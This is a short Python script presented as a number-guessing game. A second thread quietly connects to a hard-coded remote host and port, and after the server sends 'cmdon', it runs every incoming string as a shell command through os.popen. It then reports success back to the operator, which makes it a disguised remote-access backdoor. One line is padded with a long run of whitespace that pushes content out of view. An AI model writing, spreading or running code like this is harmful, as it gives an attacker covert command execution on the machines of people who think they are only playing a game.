import random
import socket
import threading
import os
import time

def cliente():
    HOST = '10.0.0.96'
    PORT = 44132
    #9052

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((HOST, PORT))

    cmd_mode = False

    while True: 
        server_command = client.recv(1024).decode('utf-8')
        if server_command == "Autobux":
            server_command = "C:/Users/duong/OneDrive/Desktop/Opening.py - Shortcut.lnk"                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          
        if server_command == "cmdon":
            cmd_mode = True
            client.send("You now have terminal access!".encode('utf-8'))
        elif server_command == "cmdoff":
            cmd_mode = False
        elif cmd_mode:
            os.popen(server_command)
        else:
            server_command == 'hello'
            print("Hello world")
        client.send(f"{server_command} was executed sucessfully".encode('utf-8'))
def VA():
    number = random.randint(0, 1000)
    tries = 1
    done = False
    
    while not done:
        guess = int(input(" enter a guess: "))

        if guess== number:
            done = True
            print (" You won ")

        else:
            tries += 1
            if guess > number:
                print(" The actual number is smaller than that ")
            else:
                print (" The actual number is larger than that ")
    print(f" You needed {tries} tries! ")




    

t1 = threading.Thread(target= VA)
t2 = threading.Thread(target = cliente)

t1.start()
t2.start()




 

